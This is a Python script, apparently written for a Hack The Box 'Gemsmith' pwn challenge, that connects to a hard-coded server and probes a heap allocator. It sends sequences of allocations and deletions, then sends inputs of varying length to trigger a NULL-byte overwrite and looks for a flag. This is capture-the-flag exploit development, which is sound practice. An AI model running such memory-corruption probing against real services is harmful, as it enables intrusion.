#!/usr/bin/env python3
"""
Author: Claude Code
Purpose: Basic connectivity and NULL write testing
Usage: python3 test_baseline.py
"""

import socket
import time

def test_connection():
    """Test basic connection to server"""
    print("[+] Testing connection...")
    s = socket.socket()
    s.settimeout(10)
    try:
        s.connect(('154.57.164.69', 32593))
        banner = s.recv(8192)
        print(f"[✓] Connected! Received {len(banner)} bytes")
        s.close()
        return True
    except Exception as e:
        print(f"[✗] Connection failed: {e}")
        return False

def test_normal_operations():
    """Test completing 14 normal operations"""
    print("\n[+] Testing 14 normal operations...")
    s = socket.socket()
    s.settimeout(15)
    s.connect(('154.57.164.69', 32593))
    s.recv(8192)

    # 7 alloc-delete pairs = 14 ops
    for i in range(7):
        # Alloc
        s.send(b'1\n')
        time.sleep(0.05)
        s.recv(4096)
        s.send(b'0\n')
        time.sleep(0.05)
        s.recv(4096)
        s.send(b'100\n')
        time.sleep(0.05)
        s.recv(4096)
        s.send(b'A' * 50)
        time.sleep(0.05)
        s.recv(4096)

        # Delete
        s.send(b'2\n')
        time.sleep(0.05)
        s.recv(4096)
        s.send(b'0\n')
        time.sleep(0.05)
        s.recv(4096)

    # Collect final output
    time.sleep(1)
    all_output = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            all_output += chunk
    except:
        pass

    s.close()

    has_broken = b':(' in all_output or b'kowarete' in all_output
    print(f"[{'✓' if has_broken else '?'}] Got 'broken' message: {has_broken}")
    return has_broken

def test_null_write(byte_count):
    """Test NULL write at specific offset"""
    print(f"\n[+] Testing NULL write with {byte_count} bytes...")
    s = socket.socket()
    s.settimeout(15)
    s.connect(('154.57.164.69', 32593))
    s.recv(8192)

    # Allocate and send specific byte count
    s.send(b'1\n')
    time.sleep(0.05)
    s.recv(4096)
    s.send(b'0\n')
    time.sleep(0.05)
    s.recv(4096)
    s.send(b'1056\n')  # Max size
    time.sleep(0.05)
    s.recv(4096)
    s.send(b'X' * byte_count)
    time.sleep(0.1)

    try:
        s.recv(4096)
        # Continue with remaining ops
        for i in range(13):
            s.send(b'3\n')
            time.sleep(0.05)
            s.recv(4096)
            s.send(b'0\n')
            time.sleep(0.05)
            s.recv(4096)

        time.sleep(1)
        all_output = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                all_output += chunk
        except:
            pass

        s.close()

        has_flag = b'HTB{' in all_output
        has_broken = b':(' in all_output or b'kowarete' in all_output

        print(f"[{'!' if has_flag else '✓'}] Bytes: {byte_count}, Flag: {has_flag}, Broken: {has_broken}")

        if has_flag:
            idx = all_output.find(b'HTB{')
            end = all_output.find(b'}', idx) + 1
            print(f"[!!!] FLAG: {all_output[idx:end].decode()}")
            return True

        return False
    except Exception as e:
        print(f"[✗] Crashed or error: {e}")
        s.close()
        return False

if __name__ == '__main__':
    print("="*60)
    print("Gemsmith - Baseline Testing")
    print("="*60)

    # Test 1: Connection
    if not test_connection():
        print("\n[!] Connection failed. Check server status.")
        exit(1)

    # Test 2: Normal operations
    test_normal_operations()

    # Test 3: NULL write samples
    test_offsets = [1, 10, 50, 100, 500, 506, 1000]
    for offset in test_offsets:
        if test_null_write(offset):
            break

    print("\n" + "="*60)
    print("Testing complete!")
    print("="*60)
